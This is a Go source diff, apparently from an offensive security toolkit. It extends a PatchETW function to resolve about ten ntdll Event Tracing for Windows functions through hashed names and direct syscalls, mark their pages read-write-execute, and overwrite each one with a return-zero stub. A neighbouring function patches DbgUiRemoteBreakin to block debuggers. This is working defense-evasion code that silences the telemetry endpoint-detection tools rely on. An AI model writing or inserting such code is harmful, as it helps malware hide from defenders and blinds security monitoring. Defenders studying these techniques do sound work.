@@ -76,54 +76,73 @@ func PatchETW() error {
 		return fmt.Errorf("ntdll.dll not found")
 	}
 
-	// 2. Get the address of EtwEventWrite
-	functionHash := obf.GetHash("EtwEventWrite")
-	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
-	if procAddr == 0 {
-		return fmt.Errorf("EtwEventWrite function not found")
+	// 2. Get the address of various ETW functions
+	functionHashes := []uintptr{
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwEventWrite")),
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwNotificationRegister")),
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwEventRegister")),
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwEventWriteFull")),
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwEventWrite")),
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwEventWriteEx")),
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwEventWriteNoRegistration")),
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwEventWriteString")),
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwEventWriteTransfer")),
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwTraceMessage")),
+		syscallresolve.GetFunctionAddress(ntdllBase, obf.GetHash("EtwTraceMessageVa")),
 	}
 
-	// 3. Change protection to RWX for that page
-	const (
-		currentProcess      = ^uintptr(0)
-		PAGE_EXEC_READWRITE = 0x40
-	)
-	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
-	patchSize := uintptr(len(patch))  // Fixed: use actual patch size (3 bytes)
-	oldProtect := uintptr(0)
-	status, err := DirectSyscall(
-		"NtProtectVirtualMemory",
-		currentProcess,
-		uintptr(unsafe.Pointer(&procAddr)),
-		uintptr(unsafe.Pointer(&patchSize)),
-		uintptr(PAGE_EXEC_READWRITE),
-		uintptr(unsafe.Pointer(&oldProtect)))
-	if err != nil {
-		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
-	}
-	if !IsNTStatusSuccess(status) {
-		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
-	}
+	for _, procAddr := range functionHashes {
+		if procAddr == 0 {
+			return fmt.Errorf("function not found")
+		}
 
-	// 4. Overwrite with the patch bytes
-	for i := 0; i < len(patch); i++ {
-		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
-	}
+		const (
+			currentProcess      = ^uintptr(0)
+			PAGE_EXEC_READWRITE = 0x40
+		)
 
-	// 5. Restore the original protection
-	status, _ = DirectSyscall(
-		"NtProtectVirtualMemory",
-		currentProcess,
-		uintptr(unsafe.Pointer(&procAddr)),
-		uintptr(unsafe.Pointer(&patchSize)),
-		oldProtect,
-		uintptr(unsafe.Pointer(&oldProtect)))
-	if !IsNTStatusSuccess(status) {
-		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
+		patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
+		patchSize := uintptr(len(patch))
+		oldProtect := uintptr(0)
+
+		// 3. Change protection to RWX
+		status, err := DirectSyscall(
+			"NtProtectVirtualMemory",
+			currentProcess,
+			uintptr(unsafe.Pointer(&procAddr)),
+			uintptr(unsafe.Pointer(&patchSize)),
+			uintptr(PAGE_EXEC_READWRITE),
+			uintptr(unsafe.Pointer(&oldProtect)),
+		)
+		if err != nil {
+			return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
+		}
+		if !IsNTStatusSuccess(status) {
+			return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
+		}
+
+		// 4. Overwrite with the patch bytes
+		for i := 0; i < len(patch); i++ {
+			*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
+		}
+
+		// 5. Restore the original protection
+		status, _ = DirectSyscall(
+			"NtProtectVirtualMemory",
+			currentProcess,
+			uintptr(unsafe.Pointer(&procAddr)),
+			uintptr(unsafe.Pointer(&patchSize)),
+			oldProtect,
+			uintptr(unsafe.Pointer(&oldProtect)),
+		)
+		if !IsNTStatusSuccess(status) {
+			return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
+		}
 	}
 
 	return nil
 }
+
 
 // PatchDbgUiRemoteBreakin patches DbgUiRemoteBreakin to prevent remote debugger attachment
 func PatchDbgUiRemoteBreakin() error {
